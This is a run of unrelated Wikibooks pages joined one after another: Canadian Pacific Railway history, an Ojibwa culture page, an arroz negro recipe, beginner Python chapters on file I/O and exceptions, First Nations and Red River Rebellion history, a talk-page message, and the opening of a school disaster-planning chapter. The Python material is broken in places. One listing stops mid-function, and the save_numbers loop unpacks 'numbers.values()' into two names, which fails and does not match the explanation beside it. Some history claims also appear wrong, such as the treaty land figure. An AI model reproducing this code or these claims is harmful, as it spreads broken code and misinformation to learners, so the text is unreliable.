First, MacDonald had to find people to do the building for him. This was done, of course, in exchange for financial benefits during and after the building of the railroad. He also hired thousands of Chinese workers who would work hard, long and cheap. Following the initial hiring and planning, frantic railway building began. Technology to go through mountains was not available back then, and an appropriate mountain pass had to be found in order for the railway to be completed.

Many industrialists, including Jay Cooke, began to see that this railway had great economic potential. However, the only industrialist that had the money to finance a railway was Sir Hugh Allan. It was proposed that Allan take on the project and he agreed, but only if he had American support. In the summer of 1871, Allan created the Canadian Pacific Railway, a company that seemed to be entirely Canadian but was actually controlled by Jay Cooke's Northern Pacific Railway.

Through the building of this railway, a governmental lapse had occurred in the conservative party which was known as the “Pacific Scandal”. This episode resulted in the resignation of MacDonald’s government. Alexander Mackenzie and the Liberals then took power and they disagreed with MacDonald, saying that the railway was much too expensive and troublesome. Mackenzie did not provide funding during his administration, so railway building ceased for the time being. Surveys as to where the railway would go continued, however, which would be useful information for the later building of the railroad and for the knowledge of the geography of the nation. Mackenzie's &quot;do nothing&quot; attitude did not sit well with the people and he was soon out of office.

MacDonald and his party, after recovering from the Pacific Scandal, returned back to office and created a national policy that dealt with three things: a system of protective tariffs, western settlement, and the CPR. The tariffs protected the Canadian market; giving them a sort of economic independence from the United States. The western settlement encouraged movement to the west because of the great potential for farming and agriculture. The Canadian Pacific Railway was the cornerstone of it all, though. Without the CPR, agriculture and transportation would not be successful in the west.

As the railway building got underway again, private investment was soon needed to continue with this endeavor. Private investors bought the St. Paul and the Pacific Railway and turned it around for a $17 million dollar profit. MacDonald proposed that upon completion of the railway, they would receive $25 million and 25 million acres. As soon as the contract was approved the investors changed the route of the railway, which caused much controversy, and also brought about much more control over the prairies and their new towns. The change in route also meant that the earlier surveying done when Mackenzie was in office, was then irrelevant. Things were falling apart in terms of building, and someone very exceptional was needed to take over this project to avoid failure.

William Van Horne, a manager of a smaller railway in America, was chosen to undertake this project. For four years he drove the workers and himself to complete CPR as efficiently as they could. Van Horne was thought to be the person who would help the CPR meet its building deadline. Funding became limited and Van Horne had to cut many corners, finding alternatives to the original plan. Safety was risked and working conditions dropped. The CPR was being built entirely by hand and still needed to be completed.

When the Northwest Rebellion broke out, the CPR allowed the federal government to react to the crisis as soon as possible. This helped the government to see that the completion of the railroad was necessary and it was decided that the project would be funded towards completion. The CPR was completed on November 7th, 1885. Although there were still gaps in the track. The final cost of the project was over $37 million. The transcontinental link was completed as well, by the fall of 1885, 5 years ahead of schedule.

== Results and Benefits of Building the Railway ==

The CPR resulted in many improvements in new Canadian towns. The first necessary small hotels sprang up. The CPR also started a postal service and a telephone service. National parks were established, drawing many people toward them, especially in the areas with hot springs. The railway also drew adventurous, thrill-seeking people towards climbing the Rocky Mountains. The Prairies were available for settlement as well, and the completion of the CPR helped to draw Europeans there. Agricultural development soon took off with wheat farming and irrigation. The industrialized east coast began to transfer business along the CPR line, and used the west coast as a window to trading with the Far East. The CPR opened up the western half of Canada to many opportunities that it would not have had without a transportation system. For example, CPR workers drilling for water in Alberta discovered the first natural gas of the province in 1883.

Not only did the CPR increase the standard of living and the quality of many Canadian towns and services, but it also helped in times of crisis. As previously stated, the Canadian Pacific Railway enabled the government to react quickly to the Northwest Rebellion, a very important thing for the government to do. The CPR also helped to transport war supplies and weapons during the First World War. When the Second World War occurred, the CPR once again helped transport ammunition and supplies.

In the 1960's, the CPR switched entirely from steam to diesel locomotives. The Canadian Pacific Railway then changed its name to Canadian Pacific Limited, a company that aimed to operate more than just the railway. Some of the other business ventures this company eventually got involved in and operated were mines, ships, hotels, minerals &amp; manufacturing, telecommunications, airlines, real estate and trucking.  Canadian Pacific Air Lines, or CP Air, was even Canada's largest airline for a brief period of time, when it was flying from Vancouver to Amsterdam over the North Pole.

      <text xml:space="preserve">The Ojibwa are the largest group of First-Nation Indians above the Mexican Border. The tribe currently consists of around 219,000 members. The Ojibwa are also known as the Chippewa and as the Saltueurs by the French. The tribe was associated with the name Chippewa because of a different pronunciation. If you place an &quot;O&quot; in front (forming O'Chippewa) the relationship is more apparent. The Ojibwa were the largest and most powerful Great Lakes tribe &lt;ref&gt;http://www.tolatsga.org/ojib.html&lt;/ref&gt;. They were formerly located at the outlet of Lake Superior, mainly around the Sault Ste. Marie area. The Ojibwa are now located primarily in the United States of America and Canada. Ojibwa who moved to the Prairie provinces of Canada are known as Saulteurs. The tribes who were originally from the Mississagi River and moved to southern Ontario are called the Mississaugas 



== Food ==
All Ojibwa were hunters and gatherers. The hunting was done with bows, arrows, spears and clubs. Spear fishing was done at night in a birch bark canoe with the aid of flaming torches which attracted the fish. Traps, snares and deadfalls were also used to catch prey, such as deer, moose, elk, bears and small animals and birds. Fish were plentiful, along with berries, nuts, roots, seeds and the most important crop: wild rice. Their diet was low-carb and consisted of lots of protein and seasonal fruits, plant stocks and roots. 
The Ojibwa in the south had all of the foods above, but the climate and terrain made it suitable for agriculture. They could grow gardens of corn and beans because of the better soil conditions and warm climate
The Ojibwa in the Northern Great Lakes were faced with a short growing season and poor soil. They couldn't grow corn or beans like the Southern Ojibwa so they harvested wild rice and maple sugar. They had no salt to use as preservatives so they mixed their food with maple syrup as seasoning. Fishing was very important for the Woodland Ojibwa and fish, such as the sturgeon, was a big part of their diet. They rarely used horses or hunted buffalo. Dogs, however, were the only domestic animal to be served at their feasts.

== Religion    ==
The Ojibwa religion was mainly self centered and focused on the belief in power received from spirits during visions and dreams. Some of the forces and spirits in Ojibwa belief were benign and not feared, such as Sun, Moon, Four Winds, Thunder and Lightning. Bad spirits, like ghosts, witches and Windigo (a supernatural cannibalistic giant) were feared. 
The Ojibwa believe that the natural world was inhabited by both good and evil spirits, some of which required special treatment. A Shaman would cure the ill and perform Shaking Tent rites to communicate with the spirits. A Shaking Tent rite was a popular ceremony among the Ojibwa, Innu, Cree, Penobscot and Abenaki. The client would pay a Shaman to build his or her tent and the Shaman would enter it at dark. Singing and Drumming was used to summon the Shaman's spirit helpers, whose arrival was signaled by the shaking of the tent and animal cries. The spirits were used to cure the ill and for anti-sorcery &lt;ref&gt;http://www.thecanadianencyclopedia.com/index.cfm?PgNm=TCE&amp;Params=A1ARTA0007318&lt;/ref&gt;. 
Due to the missionization by the Anglican and Roman Catholic Church in the nineteenth century, the religious orientation of the Ojibwa was a mix of Christian and traditional native beliefs by the mid-twentieth century &lt;ref&gt;http://www.everyculture.com/North-America/Ojibwa-Religion-and-Expressive-Culture.html&lt;/ref&gt;.

== Clothing ==
Before the first European contact, the Ojibwa wore animal skins (primarily tanned deerskin.) The women wore deerskin leggings, moccasins, dresses and petticoats made of woven nettle or thistle fibers. Girls and women decorated their clothing with bones, feathers, shells, stones and dyed porcupine quills using thorn or bone needles and thread made from nettles or animal sinew. Megis Shells were used for bead work and jewellery, and also for trade and barter. The men also wore leggings and moccasins, along with breechcloths. Animal bones, claws, and teeth were strung into necklaces.  Moccasins, leggings, bandolier bags, and aprons were decorated with beads and quill work.  Men and women normally wore their hair long and braided. In times of war, men might change their style into a scalplock. The Ojibwa began to wear woven clothing after European contact. The Europeans also introduced glass beads to the Ojibwa.

== Language ==
The Ojibwa speak a Central Algonquian language which is closely related to Algonquian, Ottawa, Cree and Potawatomi. As of 2000, Ojibwe is spoken by 69,868 people&lt;ref&gt;http://www.census.gov/prod/cen2000/phc-5-pt1.pdf&lt;/ref&gt;. There are 5 main dialects: Northern Ojibwe, Southern Ojibwe, Eastern Ojibwe, Western Ojibwe and Ottawa. Speakers of different dialects can easily converse with each other because the languages are closely related&lt;ref&gt;http://www.native-languages.org/ojibwe.htm&lt;/ref&gt;.

== Homes ==
[[Image:Ojibwa wigwam.jpg|Thumb|right|150px|A Wigwam with a domed roof.]]
The typical home for an Ojibwa person was a wiigiwaam (or a Wigwam) with either a pointed roof (called a Nasawa'ogaan) or domed roof (called a Waginowaan.)It was constructed out of birch bark, juniper bark and willow saplings. Wigwams are not like tipis. The structure usually took longer to put up and it was not portable like the tipi. There would be a hole in the roof for the smoke from the fire to escape. A typical wigwam was home to one or more families. 
The Ojibwa who lived on the Great Plains constructed tipi's out of buffalo hide&lt;ref&gt;http://www.bigorrin.org/chippewa_kids.htm&lt;/ref&gt;

== War ==
The Ojibwa often scalped other enemies, but did not torture as a rule. There was ritual cannibalism of their dead enemies, like other Great Lake warriors. As previously mentioned, the Ojibwa men would often wear their hair in a scalplock during a war.

{{recipe}} | [[Cookbook:Cuisine of Spain|Cuisine of Spain]] | [[Cookbook:Rice Recipes|Rice Recipes]]

''Arroz negro'' or ''arròs negre'' (black rice in Spanish and Catalan respectively) is a Valencian dish of cuttlefish (or [[cookbook:squid|squid]]) and [[cookbook:rice|rice]] which is very similar to seafood paella. In fact, some call it ''paella negra'' (black paella in Spanish).

''Arroz negro'' should not be confused with black rice, the collective name for several types of rice that have a naturally dark color.

The traditional recipe for this dish calls for squid ink, cuttlefish or squid, rice, [[cookbook:garlic|garlic]], green cubanelle peppers, sweet [[Cookbook:paprika|paprika]], [[cookbook:Olive Oil|olive oil]] and seafood broth. However, many cooks add other seafood as well, such as [[cookbook:crab|crab]] and [[cookbook:shrimp|shrimp]].

The dish's dark color comes from the ink which also enhances its seafood flavor.

In addition to Valencia, this dish is popular in Cuba and Puerto Rico where on both islands it's known as ''arroz con calamares'' (rice with squid in Spanish).

The below recipe&lt;ref&gt;[http://www.lacocinadejuanry.es/arroznegro.html Video in Spanish of Juanry Seguí preparing arroz negro]&lt;/ref&gt; is based on the one by Juanry Seguí, a prominent Valencian chef.

==Conversion tables==
Here's a great website with conversion tables for the metric and US measuring systems:
[http://www.botanical.com/botanical/cvcookix.html]

==Equipment==
*A 15-inch (38-centimeter) ''paellera''
*A two-gallon pot
*A rice skimmer
*A sharp chopping knife for meat and vegetables
*A large serving spoon
*A potato masher
*A clean, white towel large enough to cover the ''paellera''
*A wide heating source such as:  
:#A stove large enough to accomodate the size of the ''paellera'' (You'll have to straddle two burners at once and rotate the ''paellera'' periodically for even cooking.) 
:#A gas burne designed specifically for ''paelleras'' 
:#A charcoal barbecue 
:#A low, forged steel to support the ''paellera''
==Recipe==
'''Please read ''[[cookbook:paella cooking techniques|Paella cooking techniques]]'' before attempting this recipe.'''
===Ingredients===
====Paella====
*3 pounds diced squid
*1 pounds green cubanelle peppers
*6 cloves of minced garlic
*2 cups Valencian rice
*3 teaspoons squid ink
*1 tablespoon sweet paprika
*1 tablespoon sea salt
*olive oil

====Broth====
*8 oz crab
*8 oz smelt or fish heads
*1 medium [[cookbook:onion|onion]]
*1 medium green or red [[wikipedia:bell pepper|bell pepper]]
*3 cloves of garlic
*2 [[Cookbook:Bay Leaf|bay leaves]] 
*1 gallon of water

===Procedure===
====Broth====
#Cut one onion and one bell pepper into quarters and place in a large pot with the rest of the broth ingredients. 
#Boil for about 30 minutes. Occasionally press the ingredients against the bottom of the pot with a [[wikipedia:potato masher|potato masher]] or ladle to squeeze out their flavors. 
#Strain the broth and set aside. Discard the boiled seafood.
''Tip: To save time, start preparaing the paella once the broth starts boiling.''

====Paella====
#Pour enough oil into a ''paellera'' to cover the bottom and heat over a medium flame.
#Add one teaspoon of salt to cubanelles and [[cookbook:sautéing|sauté]] until soft.
#Add squid and sauté for two minutes.
#Add garlic and sauté until brown (be careful not to burn).
#Add rice and braise until coated with oil.
#Add paprika and sauté for no more than 15 seconds then quickly add four cups of broth to prevent the paprika from burning.
#Add squid ink and mix well.
#Bring broth to a boil and then [[wikipedia:Simmering|simmer]] for two minutes.
#Taste the broth and invite your dinner guests to do so as well. If it tastes bland, add one teaspoon of salt at a time until everybody approves.
#Add the rice.
#Begin tasting the rice after it's been simmering for about 20 minute and reduce the heat a bit. Make sure the rice doesn't get too soft. Check the rice again every 10 minutes and reduce the heat slightly after each taste. Your goal is to wind up with rice that has a slightly underdone center. The time it takes to reach this point can vary from 30 minutes to an hour depending on your cooking gear.
#Your paella is done once you've accomplished the following three things: A) The rice should be slightly firm to the bite. Italians use the same approach when cooking pasta. They call this texture ''[[Cookbook:al dente|al dente]]''. B) The paella should be a little moist but not soupy. C) You should have a bit of toasted rice on the bottom of the ''paellera''. This is considered a delicacy throughout the Spanish-speaking world.
#Remove the ''paellera'' from the heat and cover it with a white towel (NOT ALUMINUM FOIL). Allow it to sit for five minutes before serving.

      <text xml:space="preserve">=== File I/O ===

Here is a simple example of file I/O (input/output):
&lt;source lang=&quot;python&quot;&gt;
# Write a file
with open(&quot;test.txt&quot;, &quot;wt&quot;) as out_file:
    out_file.write(&quot;This Text is going to out file\nLook at it and see!&quot;)

# Read a file
with open(&quot;test.txt&quot;, &quot;rt&quot;) as in_file:
    text = in_file.read()

print(text)
&lt;/source&gt;

The output and the contents of the file &lt;code&gt;test.txt&lt;/code&gt; are:

 This Text is going to out file
 Look at it and see!

Notice that it wrote a file called &lt;code&gt;test.txt&lt;/code&gt; in the directory that you ran the program from.  The &lt;code&gt;\n&lt;/code&gt; in the string tells Python to put a ''n''ewline where it is.  

A overview of file I/O is:
* Get a file object with the &lt;code&gt;open&lt;/code&gt; function
* Read or write to the file object (depending on how it was opened)
* If you did not use &lt;code&gt;with&lt;/code&gt; to open the file, you'd have to close it manually

The first step is to get a file object.  The way to do this is to use the &lt;code&gt;open&lt;/code&gt; function.  The format is &lt;code&gt;file_object = open(filename, mode)&lt;/code&gt;  where &lt;code&gt;file_object&lt;/code&gt; is the variable to put the file object, &lt;code&gt;filename&lt;/code&gt; is a string with the filename, and &lt;code&gt;mode&lt;/code&gt; is &lt;code&gt;&quot;rt&quot;&lt;/code&gt; to ''r''ead a file as ''t''ext or &lt;code&gt;&quot;wt&quot;&lt;/code&gt; to ''w''rite a file as ''t''ext (and a few others we will skip here).  Next the file objects functions can be called.  The two most common functions are &lt;code&gt;read&lt;/code&gt; and &lt;code&gt;write&lt;/code&gt;.  The &lt;code&gt;write&lt;/code&gt; function adds a string to the end of the file.  The &lt;code&gt;read&lt;/code&gt; function reads the next thing in the file and returns it as a string.  If no argument is given it will return the whole file (as done in the example).  

Now here is a new version of the phone numbers program that we made earlier:

&lt;source lang=&quot;python&quot;&gt;
def print_numbers(numbers):
    print(&quot;Telephone Numbers:&quot;)
    for k, v in numbers.items():
        print(&quot;Name:&quot;, k, &quot;\tNumber:&quot;, v)
    print()

def add_number(numbers, name, number):
    numbers[name] = number

def lookup_number(numbers, name):
    if name in numbers:

The new portions of this program are:
&lt;source lang=&quot;python&quot;&gt;
def load_numbers(numbers, filename):
    in_file = open(filename, &quot;rt&quot;)
    while True:
        in_line = in_file.readline()
        if not in_line:
            break
        in_line = in_line[:-1]
        name, number = in_line.split(&quot;,&quot;)
        numbers[name] = number
    in_file.close()

def save_numbers(numbers, filename):
    out_file = open(filename, &quot;wt&quot;)
    for k, v in numbers.values():
        out_file.write(k + &quot;,&quot; + v + &quot;\n&quot;)
    out_file.close()
&lt;/source&gt;

First we will look at the save portion of the program.  First it creates a file object with the command &lt;code&gt;open(filename, &quot;wt&quot;)&lt;/code&gt;.  Next it goes through and creates a line for each of the phone numbers with the command &lt;code&gt;out_file.write(x + &quot;,&quot; + numbers[x] + &quot;\n&quot;)&lt;/code&gt;.  This writes out a line that contains the name, a comma, the number and follows it by a newline.

The loading portion is a little more complicated.  It starts by getting a file object.  Then it uses a &lt;code&gt;while True:&lt;/code&gt; loop to keep looping until a &lt;code&gt;break&lt;/code&gt; statement is encountered.  Next it gets a line with the line &lt;code&gt;in_line = in_file.readline()&lt;/code&gt;.  The &lt;code&gt;readline&lt;/code&gt; function will return a empty string when the end of the file is reached. The &lt;code&gt;if&lt;/code&gt; statement checks for this and &lt;code&gt;break&lt;/code&gt;s out of the &lt;code&gt;while&lt;/code&gt; loop when that happens.  Of course if the &lt;code&gt;readline&lt;/code&gt; function did not return the newline at the end of the line there would be no way to tell if an empty string was an empty line or the end of the file so the newline is left in what &lt;code&gt;readline&lt;/code&gt; returns.  Hence we have to get rid of the newline.  The line &lt;code&gt;in_line = in_line[:-1]&lt;/code&gt; does this for us by dropping the last character.  Next the line &lt;code&gt;name, number = in_line.split(&quot;,&quot;)&lt;/code&gt; splits the line at the comma into a name and a number.  This is then added to the &lt;code&gt;numbers&lt;/code&gt; dictionary.

=== Advanced use of .txt files ===

You might be saying to yourself, &quot;Well I know how to read and write to a textfile, but what if I want to print the file without opening out another program?&quot;

There are a few different ways to accomplish this. The easiest way does open another program, but everything is taken care of in the Python code, and doesn't require the user to specify a file to be printed. This method involves invoking the subprocess of another program. 

Remember the file we wrote output to in the above program? Let's use that file. 
Keep in mind, in order to prevent some errors, this program uses concepts from the Next chapter. Please feel free to revisit this example after the next chapter.

&lt;source lang=&quot;Python&quot;&gt;
import subprocess
def main():
    try:
        print(&quot;This small program invokes the print function in the Notepad application&quot;)
        #Lets print the file we created in the program above
        subprocess.call(['notepad','/p','numbers.txt'])
    except WindowsError:
        print(&quot;The called subprocess does not exist, or cannot be called.&quot;)

main()
&lt;/source&gt;

The &lt;code&gt;subprocess.call&lt;/code&gt; takes three arguments. The first argument in the context of this example, should be the name of the program which you would like to invoke the printing subprocess from. The second argument should be the specific subprocess within that program. For simplicity, just understand that in this program, &lt;code&gt;'/p'&lt;/code&gt; is the subprocess used to access your printer through the specified application. The last argument should be the name of the file you want to send to the printing subprocess. In this case, it is the same file used earlier in this chapter.

      <text xml:space="preserve">=== ...or how to handle errors ===

=== closing files with with ===

We use the &quot;with&quot; statement to open and close files.&lt;ref&gt;
[http://docs.python.org/3.4/reference/compound_stmts.html#the-with-statement &quot;The 'with' statement&quot;]
&lt;/ref&gt;&lt;ref&gt;
[http://preshing.com/20110920/the-python-with-statement-by-example/ 'The Python &quot;with&quot; Statement by Example']
&lt;/ref&gt;

&lt;source lang=&quot;python&quot;&gt;
with open(&quot;in_test.txt&quot;, &quot;rt&quot;) as in_file:
    with open(&quot;out_test.txt&quot;, &quot;wt&quot;) as out_file:
        text = in_file.read()
        data = parse(text)
        results = encode(data)
        out_file.write(results)
    print( &quot;All done.&quot; )
&lt;/source&gt;

If some sort of error happens anywhere in this code
(one of the files is inaccessible,
the parse() function chokes on corrupt data,
etc.)
the &quot;with&quot; statements guarantee that all the files will eventually be properly closed. Closing a file just means that the file is &quot;cleaned up&quot; and &quot;released&quot; by our program so that it can be used in another program.

{{todo|
Is the &quot;closing files with with&quot; section too much detail for a non-programmers tutorial?
If so, move it to some other Python Wikibook ([[Subject:Python programming language]])
}}

=== catching errors with try ===
So you now have the perfect program, it runs flawlessly, except for one detail, it will crash on invalid user input.  Have no fear, for Python has a special control structure for you.  It's called &lt;code&gt;try&lt;/code&gt; and it tries to do something.  Here is an example of a program with a problem:
&lt;source lang=&quot;python&quot;&gt;
print(&quot;Type Control C or -1 to exit&quot;)
number = 1
while number != -1:
   number = int(input(&quot;Enter a number: &quot;))
   print(&quot;You entered:&quot;, number)
&lt;/source&gt;

Notice how when you enter &lt;code&gt;@#&amp;&lt;/code&gt; it outputs something like:

 Traceback (most recent call last):
  File &quot;try_less.py&quot;, line 4, in &lt;module&gt;
    number = int(input(&quot;Enter a number: &quot;))
 ValueError: invalid literal for int() with base 10: '\\@#&amp;'

As you can see the &lt;code&gt;int()&lt;/code&gt; function is unhappy with the number &lt;code&gt;@#&amp;&lt;/code&gt; (as well it should be).  The last line shows what the problem is; Python found a &lt;code&gt;ValueError&lt;/code&gt;.   How can our program deal with this?  What we do is first: put the place where errors may occur in a &lt;code&gt;try&lt;/code&gt; block, and second: tell Python how we want &lt;code&gt;ValueError&lt;/code&gt;s handled.  The following program does this:
&lt;source lang=&quot;python&quot;&gt;
print(&quot;Type Control C or -1 to exit&quot;)
number = 1
while number != -1:
    try:
        number = int(input(&quot;Enter a number: &quot;))
        print(&quot;You entered:&quot;, number)
    except ValueError:
        print(&quot;That was not a number.&quot;)
&lt;/source&gt;

Now when we run the new program and give it &lt;code&gt;@#&amp;&lt;/code&gt; it tells us &quot;That was not a number.&quot; and continues with what it was doing before.

When your program keeps having some error that you know how to handle, put code in a &lt;code&gt;try&lt;/code&gt; block, and put the way to handle the error in the &lt;code&gt;except&lt;/code&gt; block.

=== Exercises ===
Update at least the phone numbers program (in section [[../Dictionaries|Dictionaries]]) so it doesn't crash if a user doesn't enter any data at the menu.

      <text xml:space="preserve">So here we are at the end, or maybe the beginning.  This tutorial is on Wikibooks, so feel free to make improvements to it. If you want to learn more about Python, [http://docs.python.org/3/tutorial/index.html The Python Tutorial] by [http://www.python.org/~guido/ Guido van Rossum] has more topics that you can learn about.   If you have been following this tutorial, you should be able to understand a fair amount of it.  The [[Python Programming]] wikibook can be worth looking at, too.  Here are few other books which cover Python 3:

* [http://www.swaroopch.com/notes/Python A Byte of Python by Swaroop C H]
* [http://anh.cs.luc.edu/python/hands-on/3.1/handsonHtml/index.html Hands-on Python Tutorial by Dr. Andrew N. Harrington] 
* [[Subject:Python programming language]] lists other Wikibooks related to Python.

Hopefully this book covers everything you have needed to get started programming.  Thanks to everyone who has sent me emails about it.  I enjoyed reading them, even when I have not always been the best replier.  

Happy programming, may it change your life and the world.

      <text xml:space="preserve">== 100 Centuries Ago-1497 ==


· 100 centuries ago - Aboriginals come from Asia in boats and over land bridge as Ice Age ends.  Hunt mammoths and buffalo. 
  
·100-50 centuries ago - Slowly societies evolve, complete with alliances, trading, war, and art.  Expansion across the continent leads to settlements throughout Canada.
  
· 4.000 years ago - Tunits followed caribou and muskox into the Arctic and settle.
  
· 1,000 years ago - Inuit come to Arctic, Tunit mysteriously disappear. Climate is considerably warmer than today.  The Inuit were the last great migration of First Nations, all the other Native populations were settled by this point.
  
· 1,000 years ago - Leif Ericsson and the Norse find Canada.  
  
· 1,000 years ago - Leif Ericsson attempts to settle Canada but a combination of fierce Natives, rough seas, a cooling climate drive him and his people away.
 
· 1497 - John Cabot lands in Canada. Lunn, Janet, and Christopher Moore.

== Late 1800's ==
 
The first treaties between the First Nations and the European Settlers were signed in 1871.  These treaties were the Europeans' way of controlling the First Nations in a legal, non-violent manner. However, the terms on which these treaties were written were far from fair. The treaties asked the First Nations to sign away most of the land which they occupied in return for a grant of 600 square meters of land per family of 5 people. 

Some of this land would be used for the Europeans' settlements' infrastructure. The Europeans also asked the First Nations to promise to keep alcohol off the reserves in order to help keep the peace. The First Nations were offered a small sum of money, rights to hunt and fish on their own land (which they already had), lessons in how to farm the land they were given, and schooling for the young First Nations so that they could learn to read and write English. The First Nations appeared to be selfless in their act to agree to the terms of the Europeans. However the First Nations didn’t really have a choice because their natural food sources were slowly disappearing.  The First Nations needed land to get their food and an income so that if their yield that year wasn’t enough they could purchase extra food.

== 1948-Present ==

In 1948,The Canadian Government signed the Universal Declaration of Human Rights.  This document states a common standard of achievement for all peoples and nations where teaching and education promote respect for all rights and freedoms. The Canadian Government had to re-examine its treatment of the Aboriginal Peoples to make sure they followed the decrees of the declaration. The government then decided to introduce the Indian Act in 1951.  It allowed aboriginals to perform key cultural ceremonies, such as pow-wows and potlatches. Aboriginals were granted the right to posess and drink alcohol, but only on their reserves.  The Aboriginal Peoples were also granted the right to sue the government over land claims, though none of them did successfully.  Nine years later, voting rights were extended to aboriginals.

In 1969, Prime Minister Pierre Trudeau tried to cut off all negotiations with any Native people in terms of land claims and treaties. However, the natives countered with a document called the Red Paper which convinced the government to change its policies.
 
By 1970, aboriginal civil rights were regularly discussed in the media and aboriginals were granted the right to drink outside of their reserves. 15 years later, the Canadian Indian act restored Native status to many women and their children.

      <text xml:space="preserve">The events in Canadian History that the Métis peoples are most associated with is The Red River Rebellion. The Red River Rebellion (or Red River Resistance) refers to the events triggered by the provisional government formed by the Métis people of the Red River Colony (which is now Manitoba) in 1869-1870. The leader of the provisional government was a Métis man named [[Louis Riel]].

= The Red River Settlement =

The Métis already had their own community set up at the junction of the two rivers, the Red and the Assiniboin. This was probably because they could have access to the waterways and canoe to places to trade. Some of the best prairie soils were there so they lived comfortably with crops and the buffalo hunt to sustain them through the winter, and because of their French background, they laid out their farms in seigneurial pattern, i.e. long narrow plots with one end on the river. Pemmican played a huge part in their lives because they ate it in the winter and while traveling and they traded it with the North-West Company for supplies.

Then the colony that Lord Selkirk decided to set up was right where the Métis lived. His colony was set up in the traditional English fashion, in square lots that paid no attention to what the land looked like. A colony in the Sahara would look very similar on a map to a colony in Hawaii. This naturally clashed with the Métis already living in the area.

=Causes of the Rebellion=

Three things: British incompetence, Métis pride, and both groups trying to use the same land. Well, and necessity for food/income.
The British set up camp on the Red River in 1812. By the time they finally arrived, though, they realized they hadn't brought enough food, and it was autumn, so they couldn't grow anything. The Métis had pity on them and gave them food for the winter. A mistake, as it happens. The Scottish governor, MacDonnell, issued a proclamation saying all stores of pemmican, a Métis export, were to be given to the colonists. The Métis depended on the sale of pemmican for income, however, and they couldn't survive without money either.
The Métis were not to be meekly forced off their land by William McDougall with a squared map, either. The colonists built Fort Douglas and Fort Garry at river junctions. These they had to build multiple times, as they were burned down by angry Métis residents.

== HBC Changes ==

In 1869, the Hudson’s Bay Company sold Rupert’s Land to the Canadian Government. Upon this, the Canadian Government appointed an anti-French Lieutenant Governor named William McDougall. The Métis feared losing their rights to the land and their culture as a result of this, as many had no clear deeds to their farm land, and greatly opposed his appointment.

== The Canadian Party ==

= The Uprisings =

On October 11, 1869, Riel and a group of Métis confronted and disrupted the surveyors. Later, the same people formed a group whose purpose was to represent to the Métis and people living in the Red River Settlement.

On October 25, 1869, Riel declared that any further surveyors or others sent by McDougall would be blocked from entering the settlement until further discussion.

Most of the settlement was in favour of supporting the Métis and their rights, but there was a resilient and small group of people in the settlement that formed a Canadian Party. McDougall appointed a few men to arrest the Métis occupying Upper Fort Garry in the settlement, and a man named Dr. John Christian Schultz managed to accumulate roughly 50 men to assist. Riel heard of the threat and gathered several more people to surround Schultz’s house.

Schultz and his followers surrendered as they were significantly outnumbered. On December 8th, the previous group formed when the Metis confronted the surveyors (the Métis National Committee) declared a provisional government. Ten days later, McDougall and Colonel Dennis (the man McDougall had appointed to arrest the Métis) transferred to Ontario.
 
With the advancements of the provisional government in the Canadian government’s absence, the Metis people seemed to be doing well. However, on January 9th, 1870 there was a prison break at Fort Garry, where those who were allied with Schultz were held. 12 prisoners in total escaped, including a man named Thomas Scott and another named Charles Mair. Two weeks later, John Schultz escaped as well, and by February, Riel had let the rest of the prisoners go free, so long as they swore to no longer interfere with the Métis. However, Scott, Mair and Schultz had every intention to do so.

Scott and Mair proceeded to the Canadian settlements and met Major Charles Boulton, a supporter of the Canadian Party. Boulton and his men planned to rendezvous with Schultz and overthrow the Métis, but he had misgivings and turned his party back. However, the Métis detected his movements, and captured him and his men. Scott was apprehended with Boulton, but Mair and Schultz managed to flee to Ontario and avoid capture.

Riel tried to have Boulton executed, but through several intercessions, he was pardoned. Scott openly bad-mouthed the Métis and saw Boulton’s pardon as a weakness on the Métis’ part. Soon Scott was put on trial, and sentenced to death for treason. Scott was executed by firing squad in March 1870.

= After Events/Effects of the Rebellion =

After Scott’s execution, Mair and Schultz arrived in Ontario and quickly tried to spread their anti-Métis attitude throughout the province using Scott’s execution. Still, John A. Macdonald had already realized that he needed to negotiate with the Métis. After much negotiation, Macdonald and the delegates formed the framing of what would be the Manitoba Act, which would admit Manitoba into the Canadian Confederation.

However, many Ontarians were still angered over Scott’s execution, so some time later a Canadian militia expedition was dispatched to the Red River area, now Manitoba, led by Colonel Garnet Wolseley, and was named the Wolseley expedition accordingly. Upon hearing that the militia meant to lynch him, Riel fled from the Red River as the expedition arrived, marking the end of the Red River Rebellion.

==[[The Red River Rebellion]]==
Hi Talons2009,

I hope you're enjoying your time here at Wikibooks.  I just wanted to drop in and offer you some help if I could.  I see that you have created a couple of chapters to [[Canadian History]].  However, they are currently located in the wrong place.  [[The Red River Rebellion]] needs to be moved to [[Canadian History/The Red River Rebellion]] so that it does not look like it's a book in its own right.  I suspect there may be other chapters like this as well that also need to be moved.  Depending on when you created your account, you might not be able to move pages yet (I think the account has to be four days old).  So if you need help, just let me know.  I'd be glad to pitch in.

--[[User:Jomegat|Jomegat]] ([[User talk:Jomegat|talk]]) 04:20, 26 March 2009 (UTC)

Thanks, Jomegat! 
TALONS2009 is actually a class account for a gifted students program in British Columbia, Canada. We edited many of the pages on the Canadian History page and are grateful to be contributing authors to a socials text. I'm not sure if too many of the students will be logging in, but I will post a link to this note on my class page and see if it prompts anyone to move on these corrections. If not, we will be back in September!
Thanks, 
TALONS Class</text>

      <text xml:space="preserve">== &lt;big&gt;'''What is Disaster Planning?'''&lt;/big&gt; ==



Disaster planning is having a plan prepared to be implemented in the event of a disaster. A disaster could be as small as one computer crashing to as destructive as a fire burning down the whole school. Every business, hospital, organization and school, regardless of their size, should have a disaster plan. While the planning process and the actual plan will vary based on the size and nature of the organization, the main idea is true for any size: Be prepared. If you are prepared for a disaster, the recovery time and losses will be significantly lowered. As a K-12 Technology Coordinator, you need to be in charge of the technology aspect of a disaster plan. In today's world, technology effects all aspects of the school; Schools rely on technology for teaching, storing student records and information, communication with stakeholders, and more. Therefore, you need to be prepared for a disaster, because even a small one will interrupt the school environment. 


This chapter will help you develop a plan for your school. Keep in mind, there is no perfect template for a disaster and you cannot always predict every type of disaster. You should not make a disaster plan for every possible crisis, rather, your disaster plan should be able to handle a variety of situations.


The Consortium for School Networking (CoSN), has taken on the initiative to prepare K-12 Technology Coordinators for disaster planning. They have realized that technology is affecting all aspects of the school and therefore the technology coordinator is very involved in the disaster plan. You can subscribe to their newsletter, view power points, case studies and briefs, as well as be informed of their professional development events at their website: [http://www.cosn.org/Initiatives/ITCrisisPrep/tabid/4507/Default.aspx CoSN]


[[Image:Disaster.jpg]]

This image depicts the process of disaster planning: Mitigation and Prevention and Preparedness - before the disaster, Response - during the disaster, and Recovery - after the disaster.



== '''Mitigation and Prevention:''' ==


